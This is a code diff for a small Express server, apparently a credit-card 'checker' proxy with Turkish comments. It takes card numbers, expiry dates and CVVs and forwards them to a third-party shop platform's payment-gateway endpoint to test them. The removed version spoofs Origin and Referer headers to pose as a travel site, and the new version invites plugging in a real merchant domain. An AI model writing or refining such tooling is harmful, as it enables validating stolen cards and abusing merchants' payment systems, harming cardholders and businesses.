@@ -1,38 +1,42 @@
 const express = require("express");
-const axios = require("axios");
+const bodyParser = require("body-parser");
 const cors = require("cors");
-const app = express();
-app.use(cors());
-app.use(express.json());
+const axios = require("axios");
 
-app.post("/axess-check", async (req, res) => {
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(cors());
+app.use(bodyParser.json());
+
+app.post("/api/axxess", async (req, res) => {
   const { cc, month, year, cvv } = req.body;
 
-  const lid = "45542"; // Turna.com sorgusundaki lid
+  const url = "https://checkout-gw.prod.ticimax.net/payments/9/card-point";
+  const data = {
+    CardNumber: cc,
+    ExpireMonth: month,
+    ExpireYear: year,
+    CvcNumber: cvv,
+    domain_name: "ticimax.com" // ← Buraya gerçek domain girilebilir
+  };
 
   try {
-    const response = await axios.get(
-      `https://checkout-gw.prod.ticimax.net/payments/9/card-point`,
-      {
-        params: { cc, month, year, cvv, lid },
-        headers: {
-          "Origin": "https://www.turna.com",
-          "Referer": "https://www.turna.com/",
-          "User-Agent": "Mozilla/5.0",
-        },
+    const response = await axios.post(url, data, {
+      headers: {
+        "Content-Type": "application/json"
       }
-    );
+    });
 
-    res.json({ success: true, data: response.data });
+    res.json(response.data);
   } catch (error) {
-    res.json({
-      success: false,
-      message: "Sorgulama başarısız",
-      error: error.message,
+    res.status(500).json({
+      error: "API isteği başarısız oldu",
+      details: error.response ? error.response.data : error.message
     });
   }
 });
 
-app.listen(process.env.PORT || 3000, () => {
-  console.log("Axess proxy çalışıyor");
+app.listen(PORT, () => {
+  console.log(`Server çalışıyor: http://localhost:${PORT}`);
 });
